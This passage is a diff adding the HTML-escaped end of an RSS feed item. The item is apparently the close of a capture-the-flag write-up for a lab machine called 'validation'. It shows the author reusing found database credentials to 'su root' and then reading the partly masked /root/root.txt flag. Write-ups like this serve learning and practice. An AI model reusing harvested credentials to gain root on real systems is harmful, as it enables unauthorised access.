+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These are supposed to be &lt;strong&gt;database&lt;/strong&gt; credentials, however, we have to check if they&amp;rsquo;re being reused by any user inside the machine, like &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ su root
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password:  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@validation:/var/www/html# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And it is! Not a hard privilege escalation this time.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@validation:/var/www/html# cat /root/root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8e1b95544267b95044**************
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;See you next time!&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
